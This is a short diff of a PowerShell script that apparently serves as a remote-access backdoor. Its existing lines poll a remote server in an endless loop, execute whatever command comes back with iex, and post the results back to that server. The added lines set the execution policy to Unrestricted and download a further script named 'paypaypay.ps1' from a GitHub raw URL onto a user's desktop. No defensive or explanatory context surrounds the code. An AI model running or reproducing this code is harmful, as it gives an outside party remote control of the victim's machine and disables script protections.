@@ -8,3 +8,6 @@ $p='http://';
 $v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/54db03b2 -Headers @{"X-0c52-ea08"=$i};
 
 while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/abe504df -Headers @{"X-0c52-ea08"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/ae35ff3f -Method POST -Headers @{"X-0c52-ea08"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
+
+Set-ExecutionPolicy Unrestricted
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rettbl/Useful/main/paypaypay.ps1" -OutFile "C:\Users\33640\Desktop\monfichier.ps1"
